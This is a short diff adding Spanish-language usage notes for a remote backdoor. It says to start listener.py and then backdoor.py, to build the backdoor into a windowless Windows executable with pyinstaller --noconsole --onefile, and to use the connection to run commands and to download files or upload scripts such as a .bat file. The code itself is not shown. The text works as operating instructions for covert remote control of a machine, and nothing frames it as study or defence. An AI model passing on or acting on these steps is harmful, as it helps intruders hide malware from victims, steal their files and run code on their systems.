@@ -1,0 +1,1 @@
+Instrucciones finales:Prueba local: Ejecuta primero el listener.py y luego el backdoor.py.Compilación: Si quieres usarlo en Windows sin Python, usa:pyinstaller --noconsole --onefile backdoor.pyUso: Una vez conectado, usa comandos normales o descargar nombre_archivo.png y subir mi_script.bat.
